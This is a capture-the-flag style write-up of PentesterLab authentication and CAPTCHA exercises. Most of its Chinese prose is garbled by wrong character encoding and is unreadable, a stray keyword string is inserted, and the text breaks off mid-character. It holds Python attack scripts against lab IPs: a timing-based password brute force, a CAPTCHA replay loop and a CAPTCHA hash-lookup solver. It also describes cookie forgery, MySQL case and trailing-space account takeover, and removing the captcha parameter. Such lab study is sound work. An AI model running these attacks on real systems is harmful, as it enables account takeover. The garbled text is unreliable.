ç”±ä¸Šå›¾å¯å¾—ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œçˆ†ç ´ï¼Œä¸è¿‡æ¯•ç«Ÿè¿™é‡Œæ˜¯ç¬¬ä¸€å…³ï¼Œæˆ‘ä»¬æˆ–è®¸å¯ä»¥å°è¯•å¼±å£ä»¤ æœä¸å…¶ç„¶ï¼Œè¿™é‡Œadminï¼Œadminå³å¯ç™»å½• Example 2 ç¬¬äºŒå…³æ²¡é‚£ä¹ˆå¹¸è¿ï¼Œå¹¶ä¸æ˜¯å¼±å£ä»¤ï¼Œä¸è¿‡è¿™é‡Œæç¤ºæˆ‘ä»¬usernameæ˜¯hackerï¼Œæˆ‘ä»¬åªéœ€è¦çˆ†ç ´passwordå³å¯ï¼Œè¿™é‡Œè‚¯å®šæ˜¯éœ€è¦è¿æ°”æˆåˆ†äº†ï¼Œå¦‚æœä½ çš„å­—å…¸å¤Ÿå¼ºå¤§ï¼Œé‚£è‚¯å®šå¯ä»¥è·‘å‡ºæ¥ã€‚ä¸è¿‡è¿™æ¯•ç«Ÿæ˜¯ç¬¬äºŒå…³ï¼Œä¼°è®¡ä¸ä¼šå¦‚æ­¤è€ƒè¿æ°”ã€‚å› æ­¤æˆ‘ä»¬çœ‹ä¸€ä¸‹wpå¦‚ä½•å†™ å®˜æ–¹æ˜¯è¿™æ ·è¯´çš„ï¼š This example is an exagerated version of a non-time-constant string comparison vulnerability. If you compare two strings and stop at the first invalid character, a string A with the first 6 characters in common with the string B will take more time to compare than a string Aâ€™ with only the first 2 characters in common with the string B. You can use this information to brute force the password in this example. è¯‘æ–‡ï¼š è¿™ä¸ªä¾‹å­æ˜¯ä¸€ä¸ªéæ—¶é—´å¸¸æ•°å­—ç¬¦ä¸²æ¯”è¾ƒæ¼æ´çš„å¤¸å¼ ç‰ˆæœ¬ã€‚å¦‚æœæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²å¹¶åœ¨ç¬¬ä¸€ä¸ªæ— æ•ˆå­—ç¬¦å¤„åœæ­¢ï¼Œä¸å­—ç¬¦ä¸²Bç›¸åŒçš„å‰6ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²aæ¯”ä¸å­—ç¬¦ä¸²Båªæœ‰å‰2ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²aéœ€è¦æ›´å¤šçš„æ—¶é—´è¿›è¡Œæ¯”è¾ƒã€‚ æ„æ€å°±æ˜¯å¦‚æœæˆ‘ä»¬çš„çœŸæ­£å¯†ç æ˜¯password æ­¤æ—¶å¦‚æœæˆ‘ä»¬æ‹¿pahahahahå’Œpasswoxxxä¸ä¸Šè¿°æ­£ç¡®å¯†ç è¿›è¡Œæ¯”è¾ƒçš„è¯ï¼Œé‚£ä¹ˆè‚¯å®špasswoxxxæ¯”è¾ƒçš„æ—¶é—´æ›´é•¿ï¼ˆå› ä¸ºpahhhåœ¨ç¬¬ä¸‰ä¸ªå­—ç¬¦å¼€å§‹å°±ä¸åŒ¹é…äº†ï¼Œè€Œpasswoxxxä¼šæŒç»­åŒ¹é…ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ ¹æ®æ¯”è¾ƒæ—¶é—´é•¿çŸ­æ¥é€ä½çˆ†ç ´å¯†ç ï¼š authenticationæ˜¯é€ä½æ¯”è¾ƒçš„ï¼Œæ‰€ä»¥æ­£ç¡®çš„ä¸ºä¸€ä½ä½æ¯”è¾ƒä¸‹å»ï¼Œè¿™æ ·å°±ä¼šèŠ±æ›´é•¿çš„æ—¶é—´ï¼Œé‚£ä¹ˆå°±å¯ä»¥å†™è„šæœ¬è·‘äº†ï¼Œä¸è¿‡ä¸ä¼šå†™ï¼Œè¿™é‡Œæˆ‘å°±è·Ÿç€å¤§å¸ˆå‚…ä»¬å­¦ç€å†™ï¼š import requests import time import string from requests.auth import HTTPBasicAuth def auth2(): url = \"http://192.168.123.41/authentication/example2/\" base_time = None password = \"\" passwords = string.ascii_letters + string.digits while True: tmp_start = time.time() html = requests.get(url, auth=HTTPBasicAuth(\"hacker\", password + \"a\")) base_time = time.time() - tmp_start for pwd in passwords: start = time.time() html = requests.get(url, auth=HTTPBasicAuth(\"hacker\", 'p4ssw0r' + pwd)) used_time = time.time() - start print(\"hacker:{0} -&gt; {1}\".format('p4ssw0r' + pwd, used_time)) if html.status_code == 200: print(\"[*] FIND PASSWORD: {}\".format(password + pwd)) return if used_time - base_time &gt; 0.1: password += pwd print(\"[+] password: {} ..\".format(password)) break elif base_time - used_time &gt; 0.1: password += \"a\" print(\"[+] password: {} ..\".format(password)) break print(\"Use Time: {}, password:{}\".format(time.time()-start, password + pwd)) auth2() ä¸Šè¿°è„šæœ¬æ ¹æœ¬çˆ†ç ´ä¸å‡ºæ¥ï¼Œå› æ­¤ä¸€ä½ä¸€ä½çš„æ¯”è¾ƒæˆåŠŸçš„æ¦‚ç‡æ˜¯é«˜çš„ã€‚ import requests import time import string from requests.auth import HTTPBasicAuth def auth2(): url = \"http://192.168.123.41/authentication/example2/\" base_time = None password = \"\" passwords = string.ascii_letters + string.digits for pwd in passwords: start = time.time() html = requests.get(url, auth=HTTPBasicAuth(\"hacker\", 'p4ssw0r' + pwd)) used_time = time.time() - start print(\"hacker:{0} -&gt; {1}\".format('p4ssw0r' + pwd, used_time)) è¿™é‡Œæµ‹è¯•äº†åŠå¤©ï¼Œå‘ç°æ€»æ˜¯çˆ†ç ´ä¸å‡ºæ¥ï¼Œä¹‹åé€‰æ‹©çœ‹çœ‹æ¯ä¸€ä½çˆ†ç ´çš„æ—¶é—´ï¼Œå¦‚ä¸Šå›¾ï¼Œå‘ç°è¿™ç§æ–¹æ³•ä¸ç¨³å®šï¼Œæ—¶é—´å·®ä¸å¥½ç¡®å®šï¼Œåªèƒ½æŠŠæ¯ä¸€æ¬¡çˆ†ç ´çš„æ—¶é—´éƒ½æ‹¿å‡ºæ¥è¿›è¡Œæ¯”è¾ƒæ‰æ›´å¯èƒ½ç¡®å®šå¯†ç ã€‚ï¼ˆè€Œä¸”çˆ†ç ´ç¬¬ä¸€ä½pçš„æ—¶é—´æ˜æ˜¾è¿˜ä½äºå…¶ä»–å­—ç¬¦ã€‚ã€‚ã€‚ï¼‰åªèƒ½è¯´è¿™å¯èƒ½æ˜¯æˆ‘é¶åœºçš„é—®é¢˜å§ï¼Œä¸è¿‡æˆ‘ä»¬å­¦ä¸€ä¸ªæ€è·¯ä¹Ÿæ˜¯å¥½çš„ã€‚ æ€»çš„æ¥è¯´è¯¯å·®æŒºå¤§çš„ã€‚ã€‚ã€‚ã€‚æœ€ç»ˆå¯†ç ä¸ºï¼šp4ssw0rd æˆ‘çœ‹ç€å…¶ä»–å¸ˆå‚…çš„è„šæœ¬ä¹ŸåŸºæœ¬æ²¡æ•ˆæœäº†ç°åœ¨ã€‚ ä½†å½“æˆ‘è¾“å…¥hackerä¸ä¸Šè¿°å¯†ç ä¹‹åï¼Œæ²¡æœ‰ç™»é™†æˆåŠŸã€‚ã€‚ã€‚ã€‚çœŸçš„ä¸ç†è§£äº†ï¼Œä¸è¿‡ç­‰äº†åŠå¤©çš„bpçˆ†ç ´æˆåŠŸäº† å¯†ç çš„ç¡®æ²¡é—®é¢˜ï¼Œåç»­åˆè¯•äº†è¯•ç™»å½•æˆåŠŸäº†ã€‚ã€‚ã€‚ã€‚ Example 3 æ ¹æ®æç¤ºæˆ‘ä»¬å…ˆä»¥user1çš„èº«ä»½ç™»é™†ä¸€ä¸‹ï¼Œä¸”bpæŠ“åŒ… å¯ä»¥çœ‹åˆ°cookieå­—æ®µä¸­å«æœ‰user=user1çš„å†…å®¹ï¼Œé‚£åŸºæœ¬ä¸Šå°±æ˜¯ä¿®æ”¹è¿™é‡Œäº†ï¼Œæˆ‘ä»¬ç›´æ¥å°†user1ä¿®æ”¹ä¸ºadminå³å¯ï¼Œä½†åŒæ—¶ä¹Ÿè¦ä¸»æ„å°†ä¸Šè¿°çš„?åé¢çš„getä¼ å‚çš„å†…å®¹é™¤å»ï¼Œä¸ç„¶è¿™æ˜¯ä¼šå†²çªçš„ Example 4 ç›¸åŒçš„é—®é¢˜ ä¸ä¸Šå…³ç±»ä¼¼ï¼Œä¸è¿‡è¿™é‡Œä¿®æ”¹ä¸ºäº†md5åŠ å¯†ï¼Œé‚£æˆ‘ä»¬å°†adminåŠ å¯†å³å¯ Example 5 è¿™ä¸€å…³æˆ‘é¦–å…ˆè¿›è¡Œäº†æ³¨æµ‹ï¼Œå¹¶æŠ“å–äº†å¯¹åº”çš„æ•°æ®åŒ…ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰rack.sessionçš„å­—æ®µï¼Œæˆ‘ä»¥ä¸ºè¿™é‡Œéœ€è¦æ‰¾åˆ°keyå»ä¼ªé€ è¿™ä¸ªsessionï¼Œä½†æˆ‘ä¸çŸ¥é“å»å“ªæ‰¾ï¼Œäºæ˜¯é™·å…¥äº†å›°å¢ƒï¼Œæ¥ç€çœ‹äº†wpå‘ç°åˆ©ç”¨çš„MySQLå¯¹æ•°æ®å¤§å°å†™ä¸æ•æ„Ÿçš„ç‰¹æ€§ï¼Ÿï¼Ÿï¼Ÿ å®˜æ–¹è¿™æ ·è¯´é“ æ­¤ç¤ºä¾‹æ˜¾ç¤ºäº†ä¸åŒå­—ç¬¦ä¸²æ¯”è¾ƒæ–¹æ³•çš„ç»“æœã€‚åˆ›å»ºç”¨æˆ·æ—¶ï¼Œåº”ç”¨ç¨‹åºå°†ä»¥ç¼–ç¨‹æ–¹å¼é€šè¿‡å°†æä¾›çš„ç”¨æˆ·åä¸ç°æœ‰ç”¨æˆ·è¿›è¡Œæ¯”è¾ƒæ¥æ£€æŸ¥è¯¥ç”¨æˆ·æ˜¯å¦ä¸å­˜åœ¨ã€‚å½“æ‚¨ç™»å½•æ—¶ï¼Œåº”ç”¨ç¨‹åºå°†æ£€æŸ¥æ‚¨çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æ­£ç¡®ï¼Œç„¶åå°†æ‚¨çš„ç”¨æˆ·åä¿å­˜åœ¨æ‚¨çš„ä¼šè¯ä¸­ã€‚æœ€åï¼Œæ¯æ¬¡æ‚¨è®¿é—®åº”ç”¨ç¨‹åºæ—¶ï¼Œåº”ç”¨ç¨‹åºéƒ½ä¼šæ ¹æ®ä¼šè¯ä¸­æä¾›çš„ç”¨æˆ·åæ£€ç´¢ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ã€‚ The trick here comes from the fact that the comparison when you create a user is done programmatically (i.e.: in Ruby) but when the user's details get retrieved, the comparison is done by the database. By default, MySQL (with the type VARCHAR) will perform a case insensitive comparison: \"admin\" and \"Admin\" are the same value. è¿™é‡Œçš„æŠ€å·§æ¥è‡ªäºè¿™æ ·ä¸€ä¸ªäº‹å®ï¼šåˆ›å»ºç”¨æˆ·æ—¶çš„æ¯”è¾ƒæ˜¯ä»¥ç¼–ç¨‹æ–¹å¼å®Œæˆçš„ï¼ˆå³ï¼šåœ¨ Ruby ä¸­ï¼‰ï¼Œä½†æ˜¯å½“æ£€ç´¢ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯æ—¶ï¼Œæ¯”è¾ƒæ˜¯ç”±æ•°æ®åº“å®Œæˆçš„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMySQLï¼ˆç±»å‹ä¸º VARCHAR ï¼‰å°†æ‰§è¡Œä¸åŒºåˆ†å¤§å°å†™çš„æ¯”è¾ƒï¼šâ€œadminâ€å’Œâ€œAdminâ€æ˜¯ç›¸åŒçš„å€¼ã€‚ è¿™æ ·è¯´çš„è¯ï¼Œæˆ‘ä»¬ç›´æ¥æ³¨å†ŒAdminå³å¯äº†ï¼Œè¿™æ ·åœ¨æ³¨å†Œçš„æ—¶å€™æ˜¯ç”±ç¼–ç¨‹è¯­è¨€å®Œæˆæ¯”è¾ƒçš„ï¼Œå¾ˆæ˜æ˜¾adminï¼=Adminï¼Œä½†åœ¨åç»­ç™»å½•æ—¶ï¼ŒMySQLä¸åŒºåˆ†å¤§å°å†™ï¼Œä¼šå°†Adminè®¤ä¸ºæ˜¯adminã€‚â€“ä¸å¾—ä¸è¯´å¾ˆç¥å¥‡ è¿™æ ·æˆ‘ä»¬ç›´æ¥ä»¥adminï¼š123456ç™»å½•å³å¯ï¼Œä½†æœ€åä»ç„¶æ˜¾ç¤ºAdminï¼Œè¿™ç‚¹ä¸ç†è§£ Example 6 ä¸ºäº†ä¿®å¤ä¹‹å‰çš„é—®é¢˜ï¼Œå¼€å‘äººå‘˜å†³å®šåœ¨ç”¨æˆ·åˆ›å»ºè¿‡ç¨‹ä¸­ä½¿ç”¨åŒºåˆ†å¤§å°å†™çš„æ¯”è¾ƒã€‚æ ¹æ® MySQL æ‰§è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒçš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥ç»•è¿‡æ­¤æ£€æŸ¥ï¼šMySQL å¿½ç•¥å°¾éšç©ºæ ¼ï¼ˆå³ï¼š pentesterlab å’Œ pentesterlab ç›¸ç­‰ï¼‰ã€‚ä½¿ç”¨ä¸ä¸Šé¢ç›¸åŒçš„æ–¹æ³•ï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿå‡è£…ä»¥ç”¨æˆ· admin èº«ä»½ç™»å½•ã€‚ é‚£æˆ‘ä»¬ç›´æ¥æ³¨å†Œadmin å³å¯æ³¨æ„è¿™é‡Œæœ‰ç©ºæ ¼ï¼Œæ¥ç€æˆ‘ä»¬ç”¨adminç”¨æˆ·ä»¥åŠæˆ‘ä»¬è®¾ç½®çš„å¯†ç ç™»å½•å³å¯ é˜²æ­¢æ­¤é—®é¢˜çš„ä¸€ä¸ªå¥½æ–¹æ³•æ˜¯å‘Šè¯‰æ•°æ®åº“ç”¨æˆ·åæ˜¯ä¸»é”®ã€‚ä¾‹å¦‚ï¼ŒTomcat æ–‡æ¡£ä¸­ä½¿ç”¨æ­¤æ–¹æ³•å°† SQL åç«¯ç”¨ä½œ Realmã€‚ 0x04 Captcha-éªŒè¯ç  å®˜æ–¹è¯´æ˜ï¼š åœ¨æ”»å‡»éªŒè¯ç æ—¶ï¼Œåœ¨å¼€å§‹ä¸€äº›ç¡¬æ ¸ç¼–ç ä¹‹å‰ï¼Œè¯·ç¡®ä¿ä¸å­˜åœ¨é€»è¾‘ç¼ºé™·æˆ–æŸç§å¯é¢„æµ‹æ€§ã€‚å¦‚æœæ‚¨å¯ä»¥åœ¨ä¸ç ´åéªŒè¯ç çš„æƒ…å†µä¸‹ç»•è¿‡å®ƒâ€¦è¯·ä¸è¦ç ´åå®ƒï¼ å…³æ³¨ç»†èŠ‚æ˜¯å‘ç°éªŒè¯ç é€»è¾‘ç¼ºé™·çš„å…³é”®ã€‚å½“æ‚¨éœ€è¦ç ´è§£éªŒè¯ç æ—¶ï¼Œè¯·ç¡®ä¿æ£€æŸ¥å“åº”çš„æ¯ä¸ªç»†èŠ‚ã€‚ ç¬¬ä¸€ä¸ªç¤ºä¾‹æ˜¯å¼€å‘ä¸è‰¯çš„éªŒè¯ç ï¼Œå…·æœ‰å¸¸è§çš„é€»è¾‘ç¼ºé™·ï¼Œåé¢çš„ç¤ºä¾‹æ›´å®¹æ˜“ç ´è§£å¹¶ä¸”å¯ä»¥ç ´è§£ã€‚ åœ¨ä»¥ä¸‹æ‰€æœ‰ç¤ºä¾‹ä¸­ï¼Œç›®æ ‡æ˜¯å›´ç»•éªŒè¯ç æ„å»ºè‡ªåŠ¨åŒ–ï¼Œå¹¶å®ç°é«˜æˆåŠŸç‡ï¼ˆå¤§å¤šæ•°æƒ…å†µä¸‹ä¸º 100%ï¼‰ã€‚ Example 1 æ˜ å…¥çœ¼å¸˜çš„æ˜¯ä¸€ä¸ªéªŒè¯ç é¡µé¢ï¼Œè¿™é‡Œçš„æ„æ€ä¼°è®¡æ˜¯è¦ç»•è¿‡éªŒè¯ç å§ï¼Ÿæˆ‘ä»¬çœ‹å®˜æ–¹æç¤º æ­¤è„šæœ¬æ˜¯éªŒè¯ç å®æ–½ä¸å½“çš„å¸¸è§é—®é¢˜ã€‚ä¸ºäº†é¿å…å‡ºç°é”™è¯¯æ¶ˆæ¯ï¼Œå¼€å‘äººå‘˜åœ¨ç¡®ä¿å…¶å€¼æ­£ç¡®ä¹‹å‰å…ˆæ£€æŸ¥éªŒè¯ç å‚æ•°æ˜¯å¦å­˜åœ¨ï¼š if params[:captcha] and params[:captcha] != session[:captcha] # ERROR: CAPTCHA is invalid redirect [...] end # CAPTCHA is valid [...] ä½†æ˜¯ï¼Œæ­¤ç¤ºä¾‹å­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼šå¦‚æœæœªæä¾›éªŒè¯ç ï¼Œåˆ™è„šæœ¬ä¸ä¼šå®‰å…¨å¤±è´¥ã€‚ è¿™é‡Œçœ‹ä»£ç å°±çŸ¥é“ï¼Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰æä¾›captchaå‚æ•°çš„è¯ï¼Œä»–å°±ä¸ä¼šè¿›è¡Œåç»­æ˜¯å¦æ­£ç¡®çš„åˆ¤æ–­äº†ï¼Œè¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬åˆ é™¤è¿™ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬ç›´æ¥å°±å¯ä»¥è¿›å…¥åå°è€Œä¸å¿…è¾“å…¥éªŒè¯ç  å½“æˆ‘ä»¬å…ˆè¾“å…¥éªŒè¯ç æŠ“åŒ…åï¼š å¦‚ä¸Šå›¾ï¼Œå…¶ä¸­åŒ…å«captchaå‚æ•°ï¼Œé‚£æˆ‘ä»¬åƒä¸‹å›¾ä¸€æ ·ï¼Œå°†è¯¥å‚æ•°åˆ æ‰çœ‹çœ‹ å¦‚ä¸Šå›¾ï¼ŒæˆåŠŸç»•è¿‡ Example 2 ä»ç„¶æ˜¯éªŒè¯ç é¡µé¢ï¼Œä¹ æƒ¯çš„æˆ‘ç›´æ¥æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œç»“æœæœ‰æ–°å¥‡çš„å‘ç° å¯¹åº”çš„éªŒè¯ç å›¾ç‰‡ä¸‹ï¼Œæœ‰ä¸€ä¸ªéšè—çš„è¡¨å•ï¼Œå…¶ä¸­å«æœ‰çš„valueä¼¼ä¹å°±æ˜¯éªŒè¯ç çš„å†…å®¹ï¼Œæˆ‘ä»¬ç›´æ¥å¤åˆ¶ç™»å½•å³å¯ï¼Œä½†ä¸æ¸…æ¥šæ˜¯å¦è¿™æ ·åšæ˜¯æ­£è§£ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å®˜æ–¹è¯´æ˜ åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œç­”æ¡ˆç”±åº”ç”¨ç¨‹åºæ³„éœ²ã€‚é€šè¿‡æ£€æŸ¥è¿”å›çš„ HTML é¡µé¢çš„æºä»£ç ï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿç¼–å†™ä¸€ä¸ªå¯ä»¥è‡ªåŠ¨ç ´è§£æ­¤éªŒè¯ç çš„è„šæœ¬ã€‚ ä¼¼ä¹ç»è¿‡è¿™æ ·çš„è§£é‡Šæˆ‘æ˜ç™½äº†ï¼šå¦‚æœæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªwebé¡µé¢ï¼Œå…¶ä¸­è¦æ±‚ä½ ç™»å½•ï¼Œä½†åŒæ—¶æœ‰ç€éªŒè¯ç çš„é™åˆ¶å¯¼è‡´æˆ‘ä»¬åœ¨çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç æ—¶ä¼šæœ‰ä¸€å®šçš„é˜»åŠ›ï¼Œæ­¤æ—¶ç”±äºæ¯æ¬¡åˆ·æ–°éªŒè¯ç çš„æ—¶å€™ï¼Œéƒ½ä¼šåœ¨htmlä¸­æ˜¾ç¤ºï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨çˆ†ç ´çš„æ—¶å€™ï¼ŒåŒæ—¶æŠ“å–htmlçš„éªŒè¯ç å…ƒç´ ï¼Œè¿™æ ·ç›¸å½“äºæ— é˜»åŠ›æ— é™åˆ¶çš„çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç äº†ã€‚ Example 3 ä¸è¿‡è¿™ä¸€å…³æŸ¥çœ‹æºä»£ç ä¼šå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œä½†æˆ‘ä»¬ç»§ç»­æ£€æŸ¥ä¼šå‘ç°ï¼Œåœ¨cookieå¤„ä¼šæš´éœ²æˆ‘ä»¬çš„captchaéªŒè¯ç  å®˜æ–¹è¯´æ˜ï¼šæ‚¨è¿˜å¯ä»¥ä½¿ç”¨ JavaScript æ§åˆ¶å°ä» cookie ä¸­æ£€ç´¢éªŒè¯ç å¹¶è°ƒç”¨ document.cookie ï¼š Example 4 è¿™å…³å¼€å§‹æ²¡ææ‡‚å•¥æ„æ€ï¼Œæˆ‘ä»¬çœ‹å®˜æ–¹è¯´æ˜ï¼š è¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰è¶£çš„ä¾‹å­ï¼Œå› ä¸ºè¿™æ˜¯æˆ‘åœ¨å¼€å‘è¿™å¥—ç»ƒä¹ æ—¶çŠ¯çš„ä¸€ä¸ªé”™è¯¯ã€‚ åœ¨è¿™é‡Œï¼Œæ‚¨ä¸å¿…çœŸæ­£ç ´è§£éªŒè¯ç ã€‚æ‚¨åªéœ€è¦ç ´è§£ä¸€æ¬¡ï¼Œå°±å¯ä»¥é‡å¤ä½¿ç”¨ç›¸åŒçš„å€¼å’Œä¼šè¯ ID æ¥ä¸€æ¬¡åˆä¸€æ¬¡åœ°æ‰§è¡Œç›¸åŒçš„è¯·æ±‚ã€‚å½“æ‚¨å°è¯•ç ´è§£éªŒè¯ç æ—¶ï¼Œè¯·ç¡®ä¿ç­”æ¡ˆåªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚æ‚¨å¯ä»¥é€šè¿‡ç¼–å†™ä¸€ä¸ªé‡‡ç”¨ä¼šè¯ ID å’Œå‚æ•°å€¼çš„è„šæœ¬æ¥è½»æ¾åœ°ç¼–å†™æ­¤æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œç„¶åä¸€æ¬¡åˆä¸€æ¬¡åœ°æäº¤å®ƒä»¬ã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬åªéœ€è¦å¾—çŸ¥ä¸€æ¬¡æ­£ç¡®çš„éªŒè¯ç ï¼Œå¹¶ä¸”åœ¨åç»­æˆ‘ä»¬å¯ä»¥é‡å¤æäº¤è¯¥éªŒè¯ç ï¼Œè€Œä¸å¿…æ‹…å¿ƒè¯¥éªŒè¯ç å¤±æ•ˆçš„æƒ…å†µï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åˆå¯ä»¥æ— é™åˆ¶çš„çˆ†ç ´å“åº”çš„ç”¨æˆ·åå’Œå¯†ç äº† è¿™ä¸¤ä¸ªæ—¶é—´ç‚¹ä¸‹éƒ½æ˜¯æˆåŠŸçš„ï¼ é™„ä¸Šä¸€ä¸ªå¤§ä½¬å†™çš„è„šæœ¬ï¼š import requests def captcha4(): url = \"http://192.168.123.41/captcha/example4/submit?captcha=kernel&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\" header = { \"Cookie\" : (\"rack.session=114cbd0bbb0b1a7a0758e3566dd975729b7b08f3cc3d86728206e60beacd3dc4\"), \"Referer\" : \"http://192.168.123.41/captcha/example4/\" } ss = requests.session() while True: html = ss.get(url, headers=header) print(\"html.code: {}\".format(html.status_code)) if \"Success\" in html.text: print(\"[*] Done\") break else: print(\"[-] Error\") captcha4() ä¸è¿‡æˆ‘è®¤ä¸ºæ˜¯æœ‰é—®é¢˜çš„ Example 5 è¿™é‡Œè™½ç„¶æ²¡æœ‰æ€è·¯ï¼Œä½†åœ¨æµ‹è¯•çš„æ—¶å€™å‘ç°ï¼Œä½ ä¸æ–­çš„åˆ·æ–°é¡µé¢ï¼Œä¼šå‘ç°é¡µé¢å›æ˜¾çš„éªŒè¯ç æ˜¯æœ‰é‡å¤çš„ã€‚ä½†ç»éªŒå°‘çš„æˆ‘å¹¶ä¸æ¸…æ¥šè¿™æœ‰ä»€ä¹ˆå¼±ç‚¹ï¼Œæˆ‘ä»¬ç»§ç»­çœ‹å®˜æ–¹è¯´æ˜ è¿™ä¸ªä¾‹å­æ˜¯å¼±ç‚¹çš„æœ€åä¸€ä¸ªä¾‹å­ï¼Œè¿™é‡Œçš„å¼±ç‚¹æ¥è‡ªç”¨äºåˆ›å»ºéªŒè¯ç çš„å­—å…¸ï¼› ä»…ä½¿ç”¨æœ‰é™æ•°é‡çš„å•è¯ã€‚æ‚¨å¯ä»¥é€šè¿‡ç”Ÿæˆæ‰€æœ‰å•è¯å’Œå›¾åƒçš„ MD5 çš„åˆ—è¡¨æ¥è½»æ¾ç¼–å†™ç ´è§£ç¨‹åºã€‚ç„¶åï¼Œå½“æ‚¨æƒ³è¦æäº¤è¡¨å•æ—¶ï¼Œæ‚¨åªéœ€æ£€ç´¢å›¾åƒï¼Œè®¡ç®—å…¶ MD5 å¹¶æäº¤åŒ¹é…çš„å•è¯å³å¯ã€‚ è¿™æ„æ€æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠè¿™äº›éªŒè¯ç éƒ½ä¿å­˜ä¸‹æ¥ï¼Œç„¶åæ¯æ¬¡ç”¨éªŒè¯ç ä¸ä¿å­˜ä¸‹æ¥çš„åšå¯¹æ¯”ã€‚å°±å¯ä»¥æå®šã€‚ 0dayz nacher compromise pentester security vulnerablity admin ä¸è¿‡æˆ‘è¿˜æ˜¯ä¸èƒ½ç†è§£è¿™ç§æ¼æ´çš„åˆ©ç”¨ä¹‹å¤„ï¼Œæ¯•ç«Ÿæ˜¯éœ€è¦çˆ†ç ´çš„ï¼Œä½†è¿™ä¼¼ä¹ä¹Ÿæ˜¯æœ‰ä¸€å®šåˆ©ç”¨ç‚¹çš„ï¼Œåªä¸è¿‡æˆ‘ä»¬æ¯æ¬¡éœ€è¦å°è¯•çš„æ¬¡æ•°å˜å¤šäº†å§ åœ¨é™„ä¸Šä¸€ä¸ªå¸ˆå‚…å†™çš„è„šæœ¬ï¼Œè¿™é‡Œæˆ‘çœ‹ä¸å¤ªæ‡‚ã€‚ã€‚ã€‚æ‡’å¾—è¯»äº† def captcha5(): url = \"http://192.168.60.114/captcha/example5/\" post_url = \"http://192.168.60.114/captcha/example5/submit?captcha={}&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\" # base_url = \"http://10.108.40.237/\" ss = requests.session() captcha = {} # get pic md5 dirs,folder,files = os.walk(\"./pic/\").next() for fi in files: if fi.endswith(\"png\"): path = os.path.join(dirs, fi) with open(path, \"rb\") as f: md5 = hashlib.md5(f.read()).hexdigest() print fi, fi[0: -4] captcha[md5] = fi[0: -4] # get pic html = ss.get(url) # print html.text # print html.content soup = BeautifulSoup(html.text, \"html.parser\") src = soup.select(\"img\")[0][\"src\"] print src img_data = ss.get(url + src).content print \"[+] img_url: {}\".format(url + src) with open(\"pic.png\", \"wb\") as f: f.write(img_data) with open(\"pic.png\", \"rb\") as f: img_md5 = hashlib.md5(f.read()).hexdigest() if img_md5 in captcha: html = ss.get(post_url.format(captcha[img_md5])) print \"img_content: {}\".format(captcha[img_md5]) print \"post_url: {}\".format(post_url.format(captcha[img_md5])) # print html.text if \"Success\" in html.text: print \"[+] Successful..\" else: print \"[-] Somethine Wrong\" Example 6 æ„Ÿè§‰è¿™é¢˜å°±ä¸Šéš¾åº¦äº†ï¼Œçœ‹å®˜æ–¹è¯´æ˜æˆ‘éƒ½æ•´ä¸æ˜ç™½ï¼Œä»–æ˜¯è¿™æ ·è¯´çš„ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ OCR å·¥å…·ï¼ˆTesseractï¼‰æ¥ç ´è§£è¿™ä¸ªç®€å•çš„éªŒè¯ç ã€‚è¿™é‡Œçš„ç›®æ ‡æ˜¯æ„å»ºä¸€ä¸ªè·å¾—é«˜æˆåŠŸç‡çš„è„šæœ¬ã€‚ åªéœ€ä½¿ç”¨ tesseract çš„åŸºæœ¬è„šæœ¬ï¼Œæ‚¨çš„æˆåŠŸç‡å°±å¯ä»¥è¾¾åˆ° 95% ä»¥ä¸Šã€‚æ‚¨å°†éœ€è¦ä½¿ç”¨ä»¥ä¸‹ç®—æ³•ï¼š 1.è½¬åˆ°ä¸»é¡µ http://vulnerable/captcha/example6/ è·å–æ–°çš„éªŒè¯ç å’Œ cookie ( rack.session )ã€‚ 2.æ£€ç´¢å›¾åƒï¼Œ 3.åœ¨å›¾åƒä¸Šè¿è¡Œ tesseract å¹¶æ£€ç´¢ç»“æœã€‚ 4.ä½¿ç”¨æ­£ç¡®çš„ cookie æäº¤ç»“æœã€‚ ä»¥ä¸‹å‡ ç‚¹å¯ä»¥æé«˜ä½ çš„æˆåŠŸç‡ï¼š 1.ä»…å½“å®ƒæ˜¯å•è¯æ—¶æ‰æäº¤å€¼ã€‚ 2.ä»…å½“å€¼ä»…åŒ…å«å°å†™å­—ç¬¦æ—¶æ‰æäº¤è¯¥å€¼ã€‚ æ 